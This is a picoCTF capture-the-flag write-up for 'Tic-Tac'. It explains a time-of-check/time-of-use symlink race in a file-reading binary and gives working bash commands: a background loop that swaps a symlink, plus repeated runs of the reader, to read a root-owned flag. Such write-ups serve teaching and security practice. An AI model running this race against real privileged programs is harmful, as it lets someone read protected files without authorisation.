# Tic-Tac — TOCTOU Race Condition

**Platform:** picoCTF  
**Technique:** TOCTOU (Time of Check, Time of Use) / Symlink Race  
**Difficulty:** Hard  

## Challenge Description

A binary (`txtreader`) reads a file but checks file ownership before reading. The flag is owned by root, so we can't read it directly. However, between the check (`stat`) and the read, we can swap a symlink using a race condition to read the flag.

## Vulnerability

The program does:

```cpp
if (statbuf.st_uid != getuid()) {
    cerr << "Error: you don't own this file" << endl;
    return 1;
}
// Then reads the file
```
There is a time gap between the ownership check and the actual file read. By constantly swapping a symlink between a file we own (fake) and the flag file, we can win the race and read the flag.

Exploitation
Step 1: Create a Fake File
```bash
echo FAKE{FLAG} > fake
```
This file is owned by us (ctf-player), so it passes the ownership check.

Step 2: Create a Symlink
```bash
ln -sf fake link
```
The symlink points to our fake file.

Step 3: Race the Symlink
In a background loop, constantly swap the symlink between our fake file and the flag:

```bash
while true; do ln -sf fake link; ln -sf flag.txt link; done &
```
Step 4: Read the Link Repeatedly
```bash
for i in {1..500}; do ./txtreader link; done | grep -v "Error"
```
When the program checks link, it might point to fake (owned by us). But when it reads, the symlink might have been swapped to flag.txt. The check passes (because it checked fake), but the read reads flag.txt — printing the flag.
